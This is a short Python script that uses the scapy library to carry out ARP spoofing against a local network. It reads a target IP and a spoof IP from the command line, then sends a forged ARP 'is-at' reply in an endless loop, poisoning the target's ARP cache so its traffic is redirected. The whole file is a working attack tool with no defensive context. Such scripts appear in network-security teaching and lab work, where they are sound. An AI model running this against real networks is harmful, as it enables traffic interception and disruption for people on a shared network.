from sys import argv, exit
import time
from scapy.all import sendp, ARP, Ether


if len(argv) < 3:
    print("python3.6 " +  argv[0] + ": <target> <spoof_ip>")
    exit(1)


iface = "enp7s0"
target_ip = argv[1]
fake_ip = argv[2]


ethernet = Ether()
arp = ARP(
            pdst=target_ip,
            psrc=fake_ip,
            op="is-at"
        )

packet = ethernet / arp
while True:
    sendp(packet, iface=iface)
    time.sleep(10)

